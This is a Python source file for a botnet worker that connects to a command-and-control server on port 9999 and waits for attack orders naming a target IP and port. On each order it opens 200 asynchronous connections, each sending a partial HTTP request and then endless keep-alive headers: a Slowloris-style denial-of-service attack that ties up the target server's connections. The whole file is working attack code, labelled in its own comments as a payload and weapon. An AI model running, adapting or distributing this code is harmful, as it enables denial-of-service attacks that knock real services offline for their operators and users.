import socket
import asyncio
import random
import sys

async def asymmetric_lock(target_ip, target_port):
    """The AsyncIO starvation payload from our previous build."""
    try:
        reader, writer = await asyncio.open_connection(target_ip, target_port)
        writer.write(f"GET /?{random.randint(1,1000)} HTTP/1.1\r\n".encode("utf-8"))
        await writer.drain()

        while True:
            await asyncio.sleep(random.uniform(5.0, 10.0))
            writer.write(f"X-Keep-Alive: {random.randint(1,5000)}\r\n".encode("utf-8"))
            await writer.drain()
    except: pass

async def launch_attack(target_ip, target_port):
    print(f"\033[91m[!] ORDER RECEIVED. Initiating Async Swarm against {target_ip}:{target_port}...\033[0m")
    tasks = [asyncio.create_task(asymmetric_lock(target_ip, target_port)) for _ in range(200)]
    await asyncio.gather(*tasks)

def main():
    c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        c2.connect(("127.0.0.1", 9999))
        print("\033[92m[*] Connected to C2 Master. Awaiting target coordinates...\033[0m")
    except ConnectionRefusedError:
        print("[-] C2 Server offline. Aborting.")
        sys.exit()

    while True:
        cmd = c2.recv(1024).decode("utf-8")
        if cmd.startswith("attack"):
            parts = cmd.split()
            if len(parts) == 3:
                # Trigger the async event loop to fire the weapon
                asyncio.run(launch_attack(parts[1], int(parts[2])))

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print("\n[-] Worker shutting down.")